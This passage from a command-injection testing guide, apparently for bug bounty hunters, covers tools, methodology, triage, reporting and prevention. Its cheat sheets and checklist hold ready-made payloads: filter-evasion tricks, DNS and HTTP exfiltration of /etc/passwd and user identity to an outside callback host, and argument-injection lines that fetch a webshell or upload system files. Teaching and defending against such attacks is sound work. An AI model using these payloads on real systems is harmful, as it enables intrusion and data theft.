- The kit's `poc/`: `cmdi_fuzz.py` (in-band/time/OOB + Windows probes), `revshell.py` (shell generator), `evasion.py` (WAF-evasion builder), `oob_listen.md`.
- `nuclei -tags cmdi,rce`, ffuf for the separator/evasion matrix.

### Q84. commix — how to use it and what to watch for?
`commix -u "https://target/ping?host=127.0.0.1" --level 3`. It tries separators, time-based, and file-based techniques. **Caveat:** tools false-positive heavily — always reproduce the hit by hand with a benign marker, exclude jitter, and confirm OOB from the server IP before reporting.

### Q85. interactsh / Collaborator workflow?
Start `interactsh-client -v` (or copy a Collaborator host). Put the unique host in DNS/HTTP payloads. A hit from the **target server IP**, keyed to your token, confirms blind exec; then exfiltrate `$(whoami)` into the hostname/path to carry proof. DNS first (escapes egress filters).

### Q86. How do I build a reliable success oracle?
In-band: response contains the deterministic marker (`CMDI-<rand>`/`49`). Time: a **consistent** delay over repeats vs baseline. OOB: an interactsh interaction tied to the payload's unique token + server IP. Encode all three into your fuzzer so you don't chase false positives.

### Q87. Reverse-shell / cradle generators?
The kit's `revshell.py` emits bash/nc/python/php/perl/PowerShell one-liners (with `--urlencode`). For Windows, the arsenal's §5b lists `certutil`/`bitsadmin`/`curl`/`IWR` cradles. Red-team only — bounty needs just a marker.

---

# BLACK-BOX METHODOLOGY & CHECKLIST

### Q88. Give me the step-by-step methodology.
1. **Recon** every feature that shells out (+ second-order stored values); stand up an OOB host.
2. **Baseline/classify**: benign markers → in-band / time / OOB; fingerprint OS; find the **injection context**.
3. **Detect**: separators (§19/§20), command substitution, newline; time-based (repeated); OOB (DNS/HTTP); argument injection if input is one arg.
4. **Evade** the WAF (IFS/quoting/encoding/globbing; Windows `^`/`-enc`/env-substring).
5. **Impact**: shell (benign marker → optional revshell), blind **exfil**, pivot read-only, special sinks.
6. **Report**: benign-marker proof, exclude jitter, redact secrets, **clean up**, one-finding-per-sink.

### Q89. Quick triage decision tree.
- `id`/`whoami` output returned → **in-band RCE** (Critical).
- No output → time probe (repeat) consistent delay → **blind RCE** (Critical) → strengthen with OOB/exfil.
- No delay → OOB probe → DNS/HTTP hit from server IP → **blind RCE** (Critical) → exfil `$(whoami)`.
- Input is one argument → **option injection** (curl `-o`/tar exec/git ext::sh) → file write/RCE.
- Payload blocked → **evade** (IFS/quote/encode/glob; Windows) and re-test.
- Converter/processor sink → **ImageMagick/Ghostscript/ffmpeg/exiftool** CVE.
- Only a reflected metachar / single jittery slow response → **not proven** — keep testing.

### Q90. False positives / auto-reject (don't submit these).
- A `;`/`|` merely reflected (no command ran).
- A **single** slow response after `;sleep` (jitter — re-test).
- An "invalid host" validation error (not execution).
- An OOB hit you can't tie to your payload + the target server IP.
- SSRF mislabeled (server fetched a URL, no command ran).
- "commix flagged it" with no manual reproduction.
- Self-DoS (`sleep 999`/fork bomb) instead of a benign marker.

### Q91. What makes a great command-injection report?
The exact endpoint/param/header, the payload (+ any context breakout / evasion), and the **execution evidence** (command output / a repeated delay vs baseline / a server-sourced OOB hit carrying your marker). A benign marker, an impact statement (what an attacker gains), CVSS + CWE-78 (or CWE-88), a cleanup note, and a one-finding-per-sink dedup.

---

# CHEAT SHEETS

### Q92. Separator / operator cheat sheet.
```
LINUX:    ;  |  ||  &  &&   `cmd`  $(cmd)   %0a(newline)
WINDOWS:  &  &&  |  ||   (PowerShell: ; | $())   detect: &ver / &echo %OS%
markers:  echo CMDI-7f3a9 · $(echo 49) · id · whoami · hostname    (Win: &whoami &ver &echo %OS%)
contexts: unquoted ;id · double ";id;" · single ';id;' · backtick ` ;id; ` · inside $( ) ;id; echo $(
```

### Q93. Evasion cheat sheet.
```
spaces:   cat${IFS}/etc/passwd · {cat,/etc/passwd} · cat</etc/passwd · %09
keywords: c''at · w\ho\am\i · "c"at · who$@ami · globbing /???/c?t /e??/p??swd
encode:   echo <b64>|base64 -d|bash · $(printf whoami) · echo -e '\x..'|sh
slash:    ${HOME:0:1} · ${PATH:0:1}
sep-swap: | || && %0a `cmd` $(cmd) $IFS
windows:  w^h^o^a^m^i · who""ami · %COMSPEC:~-7,3% · for /f · powershell -enc <b64-UTF16LE>
move:     try a different param/header/filename/JSON field the WAF doesn't inspect ; double-encode metachars
```

### Q94. OOB / exfil cheat sheet.
```
confirm:  ;nslookup CMDI.<id>.oast.pro · ;curl http://<id>.oast.pro/CMDI   (Win: &nslookup CMDI.<id>.oast.pro)
exfil:    ;nslookup $(whoami).<id>.oast.pro · ;curl http://<id>.oast.pro/$(id|base64)
chunk:    for c in $(cat /etc/passwd|base64|tr -d '='|fold -w60); do nslookup $c.<id>.oast.pro; done
windows:  &nslookup %COMPUTERNAME%.<id>.oast.pro · &powershell Resolve-DnsName $env:USERNAME.<id>.oast.pro
```

### Q95. Argument-injection cheat sheet.
```
curl: -o /webroot/shell.php http://YOU/shell.php · --upload-file /etc/passwd http://YOU/ · -K http://YOU/rc
tar:  --checkpoint=1 --checkpoint-action=exec=sh\ -c\ id · -I /bin/sh -c id · --to-command='sh -c id'
git:  ext::sh -c id · --upload-pack='`id`' · -c core.sshCommand='id' · malicious hook on clone
wget: --use-askpass=/x.sh · -O /path · --post-file=/etc/passwd http://YOU/
zip/rsync/ssh: --unzip-command 'sh -c id' · -e 'sh -c id' · -o ProxyCommand='sh -c id'
find/sed/awk: -exec id \; · s/x/y/e · 'BEGIN{system("id")}'
```

---

# REAL-WORLD PATTERNS & REFERENCES

### Q96. Recurring real-world patterns + CVEs.
- **"ping/traceroute/lookup/DNS" web UIs** (routers, appliances, admin panels) → the classic unauth cmdi.
- **Citrix/SonicWall/F5/Pulse/Fortinet** diagnostic endpoints → recurring unauth command injection.
- **Image/video/doc processors** → ImageTragick (CVE-2016-3714), Ghostscript (CVE-2018-16509 / CVE-2023-36664), exiftool (CVE-2021-22205/22204), ffmpeg HLS SSRF — processing-driven RCE/SSRF (cross-ref FileUpload kit).
- **Shellshock (CVE-2014-6271)** — env var (User-Agent/Cookie) → bash → RCE via CGI; still found on legacy.
- **"import/backup/export/git-clone/convert"** admin features → argument injection → RCE.
- **Confluence OGNL / Spring / OFBiz / GitLab ExifTool (CVE-2021-22205)** → RCE.
- **IoT/embedded** web UIs → the broadest cmdi surface.

### Q97. Which resources should I actually work through?
PortSwigger Web Security Academy → **OS command injection** (do all labs: in-band, blind time/OOB, output-into-DNS). OWASP Command Injection + WSTG. HackTricks **Command Injection** + **Argument Injection**. PayloadsAllTheThings **Command Injection** + **Argument Injection**. **GTFOBins** (memorize the common escalators). Hackviser & PentesterLab command-injection modules. Read 20+ disclosed HackerOne/Bugcrowd "RCE via command injection" reports to internalize patterns (especially appliance/diagnostic and processor sinks).

---

# DEFENSE — PREVENTING COMMAND INJECTION

### Q98. What's the secure-design rule?
**Don't build shell command strings from user input.** Use a parameterized API that passes arguments as a vector **without a shell**: `execve`/`posix_spawn`, Python `subprocess.run([...], shell=False)`, Node `execFile`/`spawn` (no `shell:true`), Java `ProcessBuilder` with discrete args, .NET `ProcessStartInfo.ArgumentList`. No shell = no metacharacter parsing = no injection.

### Q99. Per-risk hardening?
- **Validation:** strictly **allowlist** the expected value (e.g., a strict hostname/IP regex); reject shell metacharacters; don't rely on blacklists.
- **Argument injection:** end options with `--` and ensure the value can't begin with `-`; prefer APIs that don't interpret args as options.
- **Processors:** patch + restrict ImageMagick `policy.xml` (disable MVG/MSL/URL/ephemeral coders), Ghostscript, ffmpeg protocols; sandbox conversion.
- **Containment:** run the worker **least-privilege**, with **restricted network egress** (kills OOB exfil and metadata access), in a sandbox/container without a writable webroot.
- **Monitoring:** FIM on web/exec dirs, egress/OAST-callback detection, alert on new executables and on `?c=`/`?cmd=` access patterns.

### Q100. One-paragraph summary you can quote in a report.
*"OS command injection happens when user input reaches a shell — and the fix is to never invoke a shell with concatenated input. Pass arguments through a parameterized exec API (`execve`/`subprocess(shell=False)`/`ProcessBuilder`/`ArgumentList`) so metacharacters can't be interpreted; strictly allowlist expected values and reject anything that can start with `-`; patch and sandbox file processors (ImageMagick/Ghostscript/ffmpeg/exiftool); and run the worker least-privilege with restricted network egress so that even a residual bug can't exfiltrate data or reach cloud metadata. A single unsanitized `system()`-style call in a 'ping' or 'convert' feature can hand an attacker a shell, the cloud account, and the internal network."*

---

## APPENDIX — 60-second command-injection field checklist
```
[ ] Find sinks: ping/lookup/whois, convert/resize/transcode, tar/zip, git, backup/import, filenames, headers, second-order
[ ] Stand up an OOB host (interactsh) — most cmdi is BLIND
[ ] Baseline + classify: in-band / time / OOB ; fingerprint OS (&ver vs ;uname) ; find the injection CONTEXT
[ ] In-band: ; | || & && `cmd` $(cmd) %0a  → echo CMDI-7f3a9 / id
[ ] Context breakout: send ' and " separately → close the right quote → ";id;" / ';id;' / inside $()/`` / %0a
[ ] Time-based: ;sleep 10 (Win: & ping -n 10 / & timeout 10) — REPEAT to exclude jitter
[ ] OOB: ;nslookup CMDI.<id>.oast.pro (Win: &nslookup %COMPUTERNAME%.<id>.oast.pro) — hit from SERVER IP
[ ] Argument-only? → option injection: curl -o webroot/shell · tar --checkpoint-action=exec= · git ext::sh
[ ] WAF? → ${IFS} · c''at / w\ho\am\i · base64|bash · globbing /???/c?t · Windows ^/""/-enc/%env:~%
[ ] Special sink? → ImageMagick/Ghostscript/ffmpeg/exiftool CVE (+ FileUpload kit to land the file)
[ ] Impact: id/whoami (bounty proof) · blind exfil $(whoami)/secret via DNS · cloud metadata → creds (read-only)
[ ] CLEAN UP (no persistence) ; report: benign-marker proof, CWE-78/88, exclude jitter, one finding per sink
```
*End of guide.*
